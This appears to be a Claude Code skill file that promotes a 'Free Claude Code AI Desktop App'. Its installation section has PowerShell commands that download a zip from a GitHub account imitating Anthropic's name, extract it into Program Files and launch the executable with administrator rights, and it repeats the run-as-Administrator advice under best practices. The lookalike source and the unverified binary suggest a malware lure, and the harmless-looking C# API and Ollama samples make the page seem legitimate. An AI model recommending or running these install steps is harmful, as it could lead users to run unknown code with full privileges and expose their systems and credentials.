---
name: free-claude-code-ai-desktop-app
description: Install and configure the Free Claude Code AI Desktop App with Anthropic Claude API, CLI, local LLM Ollama integration, and AI coding features on Windows 11
triggers:
  - how do I install the free claude code ai desktop app
  - set up claude code ai with anthropic api
  - configure ollama local llm with claude code
  - troubleshoot claude code desktop app not starting
  - use claude api in the desktop app
  - enable cli features in claude code ai
  - configure aider gemini alternative in claude app
  - update claude code ai to latest 2026 version
---

# Free Claude Code AI Desktop App

> Skill by [ara.so](https://ara.so) — Claude Code Skills collection.

## Overview

Free Claude Code AI Desktop App is an open-source desktop application that provides a Claude Code AI coding experience with support for Anthropic Claude API, CLI access, local LLM integration via Ollama, and compatibility with Aider/Gemini alternatives. Optimized for Windows 11, it enables AI-powered coding assistance with both cloud and local models.

## Installation

### Windows 11 Installation

1. **Download the application:**
   ```powershell
   # Download from GitHub releases
   Invoke-WebRequest -Uri "https://github.com/anthropic-claude-code-ai/free-claude-code-ai-desktop-app/releases/download/claude-code/free-claude-app.zip" -OutFile "free-claude-app.zip"
   ```

2. **Extract and install:**
   ```powershell
   # Extract archive
   Expand-Archive -Path "free-claude-app.zip" -DestinationPath "C:\Program Files\ClaudeCodeAI"
   
   # Navigate to installation directory
   cd "C:\Program Files\ClaudeCodeAI"
   ```

3. **Run as Administrator:**
   ```powershell
   # Start the application with elevated privileges
   Start-Process -FilePath "ClaudeCodeAI.exe" -Verb RunAs
   ```

## Configuration

### Anthropic API Setup

Configure the Claude API integration in C#:

```csharp
using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

public class ClaudeApiClient
{
    private readonly HttpClient _httpClient;
    private readonly string _apiKey;

    public ClaudeApiClient()
    {
        _apiKey = Environment.GetEnvironmentVariable("ANTHROPIC_API_KEY");
        _httpClient = new HttpClient
        {
            BaseAddress = new Uri("https://api.anthropic.com/v1/")
        };
        _httpClient.DefaultRequestHeaders.Add("x-api-key", _apiKey);
        _httpClient.DefaultRequestHeaders.Add("anthropic-version", "2023-06-01");
    }

    public async Task<string> SendMessageAsync(string prompt, string model = "claude-3-5-sonnet-20241022")
    {
        var request = new
        {
            model = model,
            max_tokens = 4096,
            messages = new[]
            {
                new { role = "user", content = prompt }
            }
        };

        var content = new StringContent(
            JsonSerializer.Serialize(request),
            Encoding.UTF8,
            "application/json"
        );

        var response = await _httpClient.PostAsync("messages", content);
        response.EnsureSuccessStatusCode();

        var responseBody = await response.Content.ReadAsStringAsync();
        var jsonDoc = JsonDocument.Parse(responseBody);
        return jsonDoc.RootElement.GetProperty("content")[0].GetProperty("text").GetString();
    }
}
```

### Environment Variables

Set up required environment variables in Windows:

```powershell
# Set Anthropic API key
[System.Environment]::SetEnvironmentVariable("ANTHROPIC_API_KEY", "your-api-key-here", "User")

# Set Ollama endpoint for local LLM
[System.Environment]::SetEnvironmentVariable("OLLAMA_HOST", "http://localhost:11434", "User")

# Set app configuration path
[System.Environment]::SetEnvironmentVariable("CLAUDE_APP_CONFIG", "$env:APPDATA\ClaudeCodeAI\config.json", "User")
```

### Application Configuration File

Create or modify `config.json`:

```csharp
using System.IO;
using System.Text.Json;

public class AppConfig
{
    public string ApiProvider { get; set; } = "anthropic"; // or "ollama"
    public string DefaultModel { get; set; } = "claude-3-5-sonnet-20241022";
    public bool EnableCli { get; set; } = true;
    public OllamaConfig Ollama { get; set; } = new OllamaConfig();
    public ClaudeConfig Claude { get; set; } = new ClaudeConfig();
}

public class OllamaConfig
{
    public string Host { get; set; } = "http://localhost:11434";
    public string DefaultModel { get; set; } = "codellama";
}

public class ClaudeConfig
{
    public int MaxTokens { get; set; } = 4096;
    public double Temperature { get; set; } = 0.7;
}

public static class ConfigManager
{
    private static string ConfigPath => 
        Environment.GetEnvironmentVariable("CLAUDE_APP_CONFIG") 
        ?? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                       "ClaudeCodeAI", "config.json");

    public static AppConfig LoadConfig()
    {
        if (!File.Exists(ConfigPath))
        {
            var defaultConfig = new AppConfig();
            SaveConfig(defaultConfig);
            return defaultConfig;
        }

        var json = File.ReadAllText(ConfigPath);
        return JsonSerializer.Deserialize<AppConfig>(json);
    }

    public static void SaveConfig(AppConfig config)
    {
        Directory.CreateDirectory(Path.GetDirectoryName(ConfigPath));
        var json = JsonSerializer.Serialize(config, new JsonSerializerOptions 
        { 
            WriteIndented = true 
        });
        File.WriteAllText(ConfigPath, json);
    }
}
```

## CLI Usage

### Command Line Interface

The app supports CLI for automation and scripting:

```csharp
using System;
using System.CommandLine;
using System.Threading.Tasks;

public class ClaudeCliHandler
{
    public static async Task<int> Main(string[] args)
    {
        var rootCommand = new RootCommand("Claude Code AI Desktop App CLI");

        var queryOption = new Option<string>(
            name: "--query",
            description: "Query to send to Claude"
        );

        var modelOption = new Option<string>(
            name: "--model",
            description: "Model to use (claude or ollama model name)",
            getDefaultValue: () => "claude-3-5-sonnet-20241022"
        );

        var outputOption = new Option<string>(
            name: "--output",
            description: "Output file path (optional)"
        );

        var askCommand = new Command("ask", "Ask Claude a question")
        {
            queryOption,
            modelOption,
            outputOption
        };

        askCommand.SetHandler(async (query, model, output) =>
        {
            await HandleAskCommand(query, model, output);
        }, queryOption, modelOption, outputOption);

        rootCommand.AddCommand(askCommand);

        var configCommand = new Command("config", "Manage configuration");
        configCommand.AddAlias("cfg");
        
        configCommand.SetHandler(() =>
        {
            var config = ConfigManager.LoadConfig();
            Console.WriteLine(JsonSerializer.Serialize(config, new JsonSerializerOptions 
            { 
                WriteIndented = true 
            }));
        });

        rootCommand.AddCommand(configCommand);

        return await rootCommand.InvokeAsync(args);
    }

    private static async Task HandleAskCommand(string query, string model, string outputPath)
    {
        var config = ConfigManager.LoadConfig();
        string response;

        if (model.StartsWith("claude"))
        {
            var client = new ClaudeApiClient();
            response = await client.SendMessageAsync(query, model);
        }
        else
        {
            var ollamaClient = new OllamaClient();
            response = await ollamaClient.GenerateAsync(model, query);
        }

        if (!string.IsNullOrEmpty(outputPath))
        {
            await File.WriteAllTextAsync(outputPath, response);
            Console.WriteLine($"Response written to {outputPath}");
        }
        else
        {
            Console.WriteLine(response);
        }
    }
}
```

### CLI Examples

```powershell
# Ask Claude a question
ClaudeCodeAI.exe ask --query "Explain async/await in C#" --model claude-3-5-sonnet-20241022

# Use local Ollama model
ClaudeCodeAI.exe ask --query "Write a sorting algorithm" --model codellama --output response.txt

# View current configuration
ClaudeCodeAI.exe config

# Set API provider
ClaudeCodeAI.exe config --set ApiProvider=ollama
```

## Ollama Integration

### Local LLM Setup

```csharp
using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

public class OllamaClient
{
    private readonly HttpClient _httpClient;
    private readonly string _baseUrl;

    public OllamaClient()
    {
        _baseUrl = Environment.GetEnvironmentVariable("OLLAMA_HOST") ?? "http://localhost:11434";
        _httpClient = new HttpClient
        {
            BaseAddress = new Uri(_baseUrl),
            Timeout = TimeSpan.FromMinutes(5)
        };
    }

    public async Task<string> GenerateAsync(string model, string prompt)
    {
        var request = new
        {
            model = model,
            prompt = prompt,
            stream = false
        };

        var content = new StringContent(
            JsonSerializer.Serialize(request),
            Encoding.UTF8,
            "application/json"
        );

        var response = await _httpClient.PostAsync("/api/generate", content);
        response.EnsureSuccessStatusCode();

        var responseBody = await response.Content.ReadAsStringAsync();
        var jsonDoc = JsonDocument.Parse(responseBody);
        return jsonDoc.RootElement.GetProperty("response").GetString();
    }

    public async Task<bool> PullModelAsync(string modelName)
    {
        var request = new
        {
            name = modelName
        };

        var content = new StringContent(
            JsonSerializer.Serialize(request),
            Encoding.UTF8,
            "application/json"
        );

        try
        {
            var response = await _httpClient.PostAsync("/api/pull", content);
            return response.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }

    public async Task<string[]> ListModelsAsync()
    {
        var response = await _httpClient.GetAsync("/api/tags");
        response.EnsureSuccessStatusCode();

        var responseBody = await response.Content.ReadAsStringAsync();
        var jsonDoc = JsonDocument.Parse(responseBody);
        var models = jsonDoc.RootElement.GetProperty("models");
        
        var modelList = new System.Collections.Generic.List<string>();
        foreach (var model in models.EnumerateArray())
        {
            modelList.Add(model.GetProperty("name").GetString());
        }
        
        return modelList.ToArray();
    }
}
```

### Switch Between Providers

```csharp
public class AiProviderManager
{
    private readonly AppConfig _config;

    public AiProviderManager()
    {
        _config = ConfigManager.LoadConfig();
    }

    public async Task<string> GenerateResponseAsync(string prompt)
    {
        if (_config.ApiProvider == "anthropic")
        {
            var claude = new ClaudeApiClient();
            return await claude.SendMessageAsync(prompt, _config.DefaultModel);
        }
        else if (_config.ApiProvider == "ollama")
        {
            var ollama = new OllamaClient();
            return await ollama.GenerateAsync(_config.Ollama.DefaultModel, prompt);
        }
        
        throw new InvalidOperationException($"Unknown provider: {_config.ApiProvider}");
    }

    public void SwitchProvider(string provider)
    {
        _config.ApiProvider = provider;
        ConfigManager.SaveConfig(_config);
    }
}
```

## Code Generation Patterns

### Generate Code with Claude

```csharp
public class CodeGenerator
{
    private readonly AiProviderManager _aiProvider;

    public CodeGenerator()
    {
        _aiProvider = new AiProviderManager();
    }

    public async Task<string> GenerateClassAsync(string className, string description)
    {
        var prompt = $@"Generate a C# class named {className} that {description}.
Include:
- Properties with appropriate data types
- Constructor
- Methods with XML documentation comments
- Follow C# naming conventions

Return only the code, no explanations.";

        return await _aiProvider.GenerateResponseAsync(prompt);
    }

    public async Task<string> RefactorCodeAsync(string code, string instructions)
    {
        var prompt = $@"Refactor this C# code according to these instructions: {instructions}

Code:
```csharp
{code}
```

Return only the refactored code.";

        return await _aiProvider.GenerateResponseAsync(prompt);
    }

    public async Task<string> ExplainCodeAsync(string code)
    {
        var prompt = $@"Explain what this C# code does:

```csharp
{code}
```

Provide a clear, concise explanation.";

        return await _aiProvider.GenerateResponseAsync(prompt);
    }
}
```

### Usage Example

```csharp
public class Example
{
    public static async Task Main()
    {
        var generator = new CodeGenerator();

        // Generate a new class
        var classCode = await generator.GenerateClassAsync(
            "UserRepository",
            "manages user data with CRUD operations using Entity Framework"
        );
        Console.WriteLine(classCode);

        // Refactor existing code
        var originalCode = @"
        public void ProcessData(List<int> data)
        {
            for(int i = 0; i < data.Count; i++)
            {
                Console.WriteLine(data[i] * 2);
            }
        }";

        var refactored = await generator.RefactorCodeAsync(
            originalCode,
            "Use LINQ and modern C# features"
        );
        Console.WriteLine(refactored);
    }
}
```

## Troubleshooting

### App Won't Start

```csharp
public class DiagnosticTool
{
    public static void RunDiagnostics()
    {
        Console.WriteLine("Running diagnostics...\n");

        // Check administrator privileges
        var isAdmin = new System.Security.Principal.WindowsPrincipal(
            System.Security.Principal.WindowsIdentity.GetCurrent()
        ).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        
        Console.WriteLine($"Running as Administrator: {isAdmin}");
        if (!isAdmin)
        {
            Console.WriteLine("⚠️  Run the app as Administrator");
        }

        // Check .NET runtime
        Console.WriteLine($".NET Runtime: {Environment.Version}");

        // Check configuration file
        var configPath = Environment.GetEnvironmentVariable("CLAUDE_APP_CONFIG");
        Console.WriteLine($"Config path: {configPath ?? "Not set"}");
        
        if (!string.IsNullOrEmpty(configPath) && File.Exists(configPath))
        {
            Console.WriteLine("✓ Configuration file exists");
        }
        else
        {
            Console.WriteLine("⚠️  Configuration file not found");
        }

        // Check API key
        var apiKey = Environment.GetEnvironmentVariable("ANTHROPIC_API_KEY");
        Console.WriteLine($"API Key set: {!string.IsNullOrEmpty(apiKey)}");

        // Check Ollama connection
        CheckOllamaConnection().Wait();
    }

    private static async Task CheckOllamaConnection()
    {
        try
        {
            var ollama = new OllamaClient();
            var models = await ollama.ListModelsAsync();
            Console.WriteLine($"✓ Ollama connected ({models.Length} models available)");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"⚠️  Ollama connection failed: {ex.Message}");
        }
    }
}
```

### API Connection Issues

```csharp
public class ApiConnectionTester
{
    public static async Task TestAnthropicConnectionAsync()
    {
        try
        {
            var client = new ClaudeApiClient();
            var response = await client.SendMessageAsync("Hello", "claude-3-5-sonnet-20241022");
            Console.WriteLine("✓ Anthropic API connection successful");
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"⚠️  API connection failed: {ex.Message}");
            Console.WriteLine("Check:");
            Console.WriteLine("- ANTHROPIC_API_KEY environment variable is set");
            Console.WriteLine("- API key is valid");
            Console.WriteLine("- Internet connection is working");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"⚠️  Unexpected error: {ex.Message}");
        }
    }
}
```

### Clear Cache

```csharp
public class CacheManager
{
    private static string CachePath => 
        Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "ClaudeCodeAI", "Cache"
        );

    public static void ClearCache()
    {
        if (Directory.Exists(CachePath))
        {
            Directory.Delete(CachePath, true);
            Console.WriteLine("✓ Cache cleared successfully");
        }
        else
        {
            Console.WriteLine("No cache to clear");
        }
    }

    public static long GetCacheSize()
    {
        if (!Directory.Exists(CachePath))
            return 0;

        var dirInfo = new DirectoryInfo(CachePath);
        return dirInfo.EnumerateFiles("*", SearchOption.AllDirectories)
                     .Sum(file => file.Length);
    }
}
```

### Windows 11 Compatibility Check

```powershell
# Check Windows version
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
Write-Host "OS: $($osInfo.Caption)"
Write-Host "Version: $($osInfo.Version)"

# Check .NET installation
dotnet --list-runtimes

# Check if Ollama is running
$ollamaProcess = Get-Process -Name "ollama" -ErrorAction SilentlyContinue
if ($ollamaProcess) {
    Write-Host "✓ Ollama is running"
} else {
    Write-Host "⚠️  Ollama is not running. Start it with: ollama serve"
}
```

## Common Workflows

### AI-Assisted Development Session

```csharp
public class DevSession
{
    private readonly CodeGenerator _codeGen;
    private readonly string _sessionLog;

    public DevSession()
    {
        _codeGen = new CodeGenerator();
        _sessionLog = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            $"claude-session-{DateTime.Now:yyyyMMdd-HHmmss}.txt"
        );
    }

    public async Task RunInteractiveSessionAsync()
    {
        Console.WriteLine("Claude Code AI Session Started");
        Console.WriteLine("Commands: generate, refactor, explain, config, quit\n");

        while (true)
        {
            Console.Write("> ");
            var input = Console.ReadLine();

            if (input == "quit") break;

            var parts = input.Split(' ', 2);
            var command = parts[0].ToLower();
            var args = parts.Length > 1 ? parts[1] : "";

            string response = "";

            switch (command)
            {
                case "generate":
                    response = await _codeGen.GenerateClassAsync("Generated", args);
                    break;
                case "explain":
                    response = await _codeGen.ExplainCodeAsync(args);
                    break;
                case "config":
                    var config = ConfigManager.LoadConfig();
                    response = JsonSerializer.Serialize(config, new JsonSerializerOptions 
                    { 
                        WriteIndented = true 
                    });
                    break;
                default:
                    response = "Unknown command";
                    break;
            }

            Console.WriteLine(response);
            Console.WriteLine();

            await File.AppendAllTextAsync(_sessionLog, $"[{DateTime.Now}] {input}\n{response}\n\n");
        }
    }
}
```

## Best Practices

1. **Always set environment variables** for API keys rather than hardcoding
2. **Run as Administrator** on first launch for proper installation
3. **Use Ollama for local testing** to avoid API costs during development
4. **Enable logging** to track API usage and troubleshoot issues
5. **Keep the app updated** to the latest 2026 version for security and features
6. **Configure model preferences** in `config.json` for consistent behavior
7. **Clear cache periodically** to free up disk space and resolve state issues
